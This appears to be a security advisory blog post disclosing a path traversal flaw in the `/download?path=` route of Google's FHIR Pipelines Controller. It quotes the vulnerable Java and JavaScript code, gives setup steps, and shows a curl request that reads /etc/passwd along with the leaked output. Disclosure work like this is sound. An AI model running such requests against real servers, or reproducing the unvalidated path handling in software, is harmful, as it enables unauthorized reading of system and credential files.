---
layout: post
title:  "Google: Local File Inclusion in FHIR Pipelines Controller"
date:  2024-05-16 10:31:06 +0800
categories: file-inclusion
---

## Name

> Local File Inclusion in FHIR Pipelines Controller

## Weakness

> CWE-22: Path Traversal

## Severity

> High (8.8)


## Description

A local file inclusion is present in the FHIR Pipelines Controller when fetching error log file under the `/download?path=` route.

## Proof of Concept

The [route](https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115) `/download` is used for fetching error log if [pipeline run failed](https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/resources/templates/index.html#L241). However, the `path` parameter is not limited to `dwhRoot` folder causing any file on the filesystem can be read.

The [spring boot rest controller](https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115) to download the log file:

```
@GetMapping(
      value = "/download",
      produces = {MediaType.TEXT_PLAIN_VALUE})
public ResponseEntity<InputStreamResource> download(@RequestParam(name = "path") String path)
      throws IOException {
    ResourceId resourceId = FileSystems.matchNewResource(path, false);
    ReadableByteChannel channel = FileSystems.open(resourceId);
    InputStream stream = Channels.newInputStream(channel);
    InputStreamResource inputStreamResource = new InputStreamResource(stream);
    MultiValueMap<String, String> headers = new HttpHeaders();
    headers.put("Content-type", Arrays.asList(MediaType.TEXT_PLAIN_VALUE));
    return new ResponseEntity<>(inputStreamResource, headers, HttpStatus.OK);
}
```

The [frontend view](https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/resources/templates/index.html#L241) to fetch log file:
```
<div th:unless="${#strings.isEmpty(lastRunDetails.logFilePath)}">
    Last run failed! Please find error logs here
    <button type="submit"
            class="button btn btn-primary" th:onclick="openLogs([[${lastRunDetails.logFilePath}]])">
        View Raw Logs
    </button>
</div>
```
The [javascript function openLogs](https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/resources/templates/index.html#L18) to fetch the file:
```
function openLogs(logPath) {
    const url = "/download?path="+logPath;
    // Encode the special characters in the url
    const encodedURL = encodeURI(url);
    window.open(encodedURL, '_blank').focus();
}
```

The [log file path](https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/PipelineManager.java#L757) `logFilePath` is supposed to `dwhRoot + ERROR_FILE_NAME`:

```
String fileSeparator = DwhFiles.getFileSeparatorForDwhFiles(dwhRoot);
dwhRoot = dwhRoot.endsWith(fileSeparator) ? dwhRoot : dwhRoot + fileSeparator;
ResourceId errorResource = FileSystems.matchNewResource(dwhRoot + ERROR_FILE_NAME, false);
if (dwhFilesManager.doesFileExist(errorResource)) {
    dwhRunDetails.setLogFilePath(dwhRoot + ERROR_FILE_NAME);
}
```

### Steps to reproduce

Following the official [tutorial](https://github.com/google/fhir-data-pipes/wiki/Try-out-the-FHIR-Pipelines-Controller#set-up-the-test-server) to set up the HAPI FHIR server and the FHIR Pipelines Controller service:

0. Clone the fhir-data-pipes repository.

1. Set up a local HAPI FHIR server using docker:

    ```
    docker network create cloudbuild
    docker-compose  -f ./docker/hapi-compose.yml up  --force-recreate -d
    ```
    The base URL for this server is http://localhost:8098/fhir.

2. Open [pipelines/controller/config/application.yml](https://github.com/google/fhir-data-pipes/blob/master/pipelines/controller/config/application.yaml) in a text editor. Change `fhirServerUrl` to be:

    ```
    fhirServerUrl: "http://localhost:8091/fhir"
    ```
3. Open [pipelines/controller/config/hapi-postgres-config.json](https://github.com/google/fhir-data-pipes/blob/master/pipelines/controller/config/hapi-postgres-config.json). Change `databaseHostName` to be:

    ```
    "databaseHostName" : "localhost"
    ```
4. Build the fhir-data-pipes service. In fhir-data-pipes root directory, run following:

    ```
    cd fhir-data-pipes-master
    mvn install -Dlicense.skip=true
    ```
5. After built successfully, `pipelines/controller/target/controller-bundled.jar` is generated. Run the server in `pipelines/controller/` directory:

    ```
    cd pipelines/controller/
    java -jar target/controller-bundled.jar
    ```
    After service up, the FHIR Pipelines Controller will listen on `http://0.0.0.0:8080`. Open the webpage `http://0.0.0.0:8080` in browser, We can see FHIR Pipelines Control Panel. Send following request to `/download` route:

    ```
    curl http://10.15.0.5:8080/download?path=/etc/passwd
    ```

    The output is the contents of the `/etc/passwd` file:

    ```
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    ```

## Impact

Any file on the backend filesystem can be read by an attacker with access to the FHIR Pipelines Controller service.


## Occurrences

[https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115](https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115)
